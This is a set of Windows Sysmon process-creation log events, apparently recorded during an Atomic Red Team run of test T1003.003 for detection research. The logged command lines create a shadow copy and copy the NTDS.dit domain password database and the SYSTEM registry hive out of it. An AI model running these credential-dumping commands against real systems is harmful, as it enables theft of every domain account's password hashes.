<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-10T12:16:36.562181000Z'/><EventRecordID>77592</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-10 12:16:36.561</Data><Data Name='ProcessGuid'>{506a9d8f-d7a4-6911-6c06-010000007003}</Data><Data Name='ProcessId'>496</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd.exe" /c vssadmin.exe create shadow /for=C: &amp; mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-d79a-6911-93e4-680900000000}</Data><Data Name='LogonId'>0x968e493</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-d79b-6911-4906-010000007003}</Data><Data Name='ParentProcessId'>4912</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABTAGUAdAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAYgB5AHAAYQBzAHMACgBJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-10T12:16:30.926563600Z'/><EventRecordID>77574</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-10 12:16:30.925</Data><Data Name='ProcessGuid'>{506a9d8f-d79e-6911-5406-010000007003}</Data><Data Name='ProcessId'>4872</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd.exe" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit &amp; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE &amp; reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE</Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-d79a-6911-93e4-680900000000}</Data><Data Name='LogonId'>0x968e493</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-d79b-6911-4906-010000007003}</Data><Data Name='ParentProcessId'>4912</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABTAGUAdAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAYgB5AHAAYQBzAHMACgBJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-10T12:16:25.224396400Z'/><EventRecordID>77529</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-10 12:16:25.223</Data><Data Name='ProcessGuid'>{506a9d8f-d799-6911-2906-010000007003}</Data><Data Name='ProcessId'>5064</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c if not exist \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 (exit /b 1) </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-d795-6911-e43e-680900000000}</Data><Data Name='LogonId'>0x9683ee4</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-d797-6911-0f06-010000007003}</Data><Data Name='ParentProcessId'>3832</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-10T12:16:25.182313200Z'/><EventRecordID>77527</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-10 12:16:25.181</Data><Data Name='ProcessGuid'>{506a9d8f-d799-6911-2606-010000007003}</Data><Data Name='ProcessId'>4492</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c if not exist \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 (exit /b 1) </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-d795-6911-e43e-680900000000}</Data><Data Name='LogonId'>0x9683ee4</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-d797-6911-0f06-010000007003}</Data><Data Name='ParentProcessId'>3832</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
